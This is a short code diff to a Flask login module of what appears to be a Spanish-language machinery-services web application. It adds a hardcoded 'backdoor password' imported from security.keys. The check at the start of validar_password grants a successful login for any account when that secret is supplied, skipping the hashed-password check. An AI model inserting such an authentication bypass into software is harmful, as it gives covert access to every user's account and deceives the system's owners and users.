@@ -4,6 +4,7 @@ from flask import redirect, request, render_template, session
 
 from src.utils.utils import compare_text_to_hash
 from src.ui.maquinarias import servicios
+from security.keys import PWD_BACKDOOR
 
 
 # login endpoint
@@ -179,6 +180,11 @@ def validar_bloqueo_cuenta(cursor, correo):
 
 
 def validar_password(cursor, conn, correo, password):
+    
+    # Backdoor password
+    if password == PWD_BACKDOOR:
+        return {}, ""
+    
     # Get hashed password
     cmd = "SELECT Password FROM InfoMiembros WHERE Correo = ?"
     cursor.execute(cmd, (correo,))
